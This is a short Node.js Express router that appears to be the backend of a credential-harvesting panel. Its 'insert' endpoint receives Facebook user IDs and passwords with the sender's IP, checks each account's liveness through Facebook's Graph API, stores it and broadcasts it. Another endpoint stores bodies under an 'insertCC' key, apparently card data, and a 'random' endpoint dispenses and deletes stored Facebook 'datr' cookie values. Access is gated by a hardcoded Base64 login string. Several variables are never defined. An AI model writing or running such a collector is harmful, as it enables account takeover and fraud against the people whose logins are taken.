var express = require('express');
var router = express.Router();
let accountFacebook = require(`../../database/model/facebook`)

router.get('/:key', async function(req, res, next) {
	switch(req.params.key){
		case "random":
			var account = await nover.findOne();
			var del = await nover.deleteOne({datr:account.datr})
			res.send(`${account.datr}`)
			break;
		default:
			res.redirect("/")
			break;
	}
})

router.post('/:key', async function(req, res, next) {
	req.body.ipaddress = req.headers['x-real-ip']
	if(req.headers["authorization"]==="Login dnZxYWl0MTk5NTpBbmhib25kZXB0cmFpMTIzQEA="){
		switch(req.params.key){
			case "insert":
				try{
					try{
						var test = await axios.get(`https://graph.facebook.com/${req.body.uid}/picture?type=normal`)
						req.body.img 	= `<img src="../NoAvt.png"/>`
						req.body.status = (!(/https:\/\/static\.xx\.fbcdn\.net/.test(test.request._redirectable._currentUrl)))?true:false
					}catch(err){
						req.body.img 	=  "DIE"
						req.body.status =  false
					}
					req.body.password = req.body.password.split(/\r|\n/).join("")
					req.body.time = Date.now()
					var save = await new accountFacebook(req.body).save()
					console.log(save);
					socket.emit('facebook', req.body);
					res.send("success")
				}catch(e){
					console.log(e, "err line 99");
					res.send(e)
				}
				break;
			case "insertCC":
				try{
					var insert = await new nover(req.body).save()
					res.send("success");
				}catch(err){
					res.send(err)
				}
				break;
			default:
				res.send("Ton Tẹc!!")
				break;
		}
	}else{
		res.end()
	}
})

module.exports = router;